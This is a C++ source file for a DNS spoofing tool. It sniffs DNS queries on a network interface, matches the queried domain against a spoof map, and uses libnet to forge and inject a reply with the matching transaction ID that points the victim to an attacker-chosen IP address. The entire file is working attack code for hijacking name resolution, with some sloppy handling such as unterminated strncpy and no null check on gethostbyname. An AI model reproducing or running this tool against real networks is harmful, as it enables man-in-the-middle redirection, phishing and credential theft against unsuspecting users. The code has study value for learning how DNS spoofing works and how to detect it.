#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include <string>
#include <map>
#include <iostream>

#include "dns_spoofer.h"
#include "../helper.h"

std::string getSpoofedAddressForThisSite(char *questionedSite) {
    std::string questionedAddressString(questionedSite);
    char dotArray[] = {'\u0002', '\u0003', '\u0004', '.'};
    std::map<std::string, std::string>::iterator it;
    std::shared_ptr<std::map<std::string, std::string>> spoofMap = getSpoofMap();
    for (it = spoofMap->begin(); it != spoofMap->end(); it++ ) {
        std::size_t found = questionedAddressString.find(it->first);    // find domain in questionedAddress
        if (found == std::string::npos) continue;
        for (char &beginDot : dotArray) {
            for (char &endDot : dotArray) {
                std::stringstream str;
                str << beginDot << it->first << endDot;
                found = questionedAddressString.find(str.str());        // find domain with dots in questionedAddress
                if (found != std::string::npos) {
                    return it->second;
                }
            }
        }
    }
    return "";
}

bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
    auto *eth_hdr = (struct ethhdr *) frame;
    int header_size = sizeof(struct ethhdr);

    if (eth_hdr->h_proto == htons(ETH_P_IP)) {
        auto *ip_hdr = (struct iphdr *) (frame + header_size);
        header_size += (ip_hdr->ihl * 4);
        unsigned int ip_size = ntohs(ip_hdr->tot_len);    // h->caplen - sizeof(struct ethhdr) which is 14
        if (ip_hdr->protocol == PROTOCOL_UDP) {
            struct udphdr *udp_hdr = (struct udphdr *) (frame + header_size);
            header_size += sizeof(struct udphdr);
            unsigned int udp_size = ntohs(udp_hdr->len);
            if (udp_hdr->dest == htons(PORT_DNS)) {
                unsigned int dns_size = udp_size - sizeof(struct udphdr);
                struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (frame + header_size);
                header_size += sizeof(struct DNS_HEADER);
                // TODO checking DNS_header flags and questNo?

                char *dns_query = (char *) (frame + header_size);
                int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end

                char questionedAddress[dns_query_size];
                strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
                std::string spoofedSite = getSpoofedAddressForThisSite(questionedAddress);
                if (spoofedSite.compare("") != 0) {

                    struct hostent *addrent = gethostbyname(spoofedSite.c_str());
                    if (addrent->h_length != 4) {
                        printf("%s", "ERROR!");
                    }

                    struct dns_answer answer = dns_answer((unsigned char*)addrent->h_addr);

                    u_int32_t datalen = dns_query_size + sizeof(struct QUESTION) + DNS_ANSWER_SIZE;
                    u_int8_t *data = (u_int8_t *) (malloc(datalen));

                    memcpy(data, dns_query, dns_query_size + sizeof(struct QUESTION));
                    memcpy(data + dns_query_size + sizeof(struct QUESTION), &answer, DNS_ANSWER_SIZE);

                    char errbuf[LIBNET_ERRBUF_SIZE];
                    static struct libnet_context *ln = libnet_init(LIBNET_RAW4_ADV, interface_name, errbuf);
                    // LIBNET_RAW4_ADV means that You have to build up to ip header

                    libnet_build_dns_spoof(
                            ip_hdr->daddr,                 /* source ip address */
                            ip_hdr->saddr,                 /* destination ip address */
                            ntohs(udp_hdr->source),        /* destination port (same as source port of response */
                            ntohs(dns_header->transId),    /* dns transaction id (same as in request) */
                            data,                          /* request data (dns question and answer */
                            datalen,
                            ln                             /* libnet hook */
                    );

                    libnet_write(ln);
                    unsigned char* address = (unsigned char*) addrent->h_addr;
                    std::cout << questionedAddress << " -> " << spoofedSite
                              <<" (" << (int)address[0] << "." <<(int)address[1] << "."
                              << (int)address[2] << "." << (int)address[3] << ")\n";
                    return true;
                }
            }
        }
    }
    return false;
}

void libnet_build_dns_spoof(__be32 source_ip,
                            __be32 destination_ip,
                            uint16_t destination_udp_port,
                            uint16_t dns_transaction_id,
                            const u_int8_t *data, u_int32_t datalen,
                            libnet_context *ln) {
    libnet_build_dnsv4(
            LIBNET_UDP_DNSV4_H,
            dns_transaction_id,         /* DNS packet id */
            0x8180,                     /* flags: standard reply, no error */
            1,                          /* number of questions */
            1,                          /* number of answer resource records */
            0,                          /* number of authority resource records */
            0,                          /* number of additional resource records */
            data,                       /* optional payload or NULL */
            datalen,                    /* payload length or 0 */
            ln,                         /* pointer to a libnet context */
            0);                         /* protocol tag to modify an existing header, 0 to build a new one */
    libnet_ptag_t t;
    t = libnet_build_udp(
            PORT_DNS,                                       /* source port */
            destination_udp_port,                           /* destination port */
            LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen,    /* packet size */
            0,                                              /* checksum: (0 for libnet to autofill)*/
            NULL,                                           /* payload or NULL*/
            0,                                              /* payload size or 0*/
            ln,                                             /* libnet handle */
            0);                                             /* libnet id */
    libnet_toggle_checksum(ln, t, LIBNET_ON);
    t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen, /* length */
            0,                                                           /* TOS */
            0xf505,                                                      /* IP ID */
            0,                                                           /* IP Frag */
            64,                                                          /* TTL */
            IPPROTO_UDP,                                                 /* protocol */
            0,                                                           /* checksum */
            source_ip,                                                   /* source IP */
            destination_ip,                                              /* destination IP */
            NULL,                                                        /* payload */
            0,                                                           /* payload size */
            ln,                                                          /* libnet handle */
            0);
    libnet_toggle_checksum(ln, t, LIBNET_ON);
}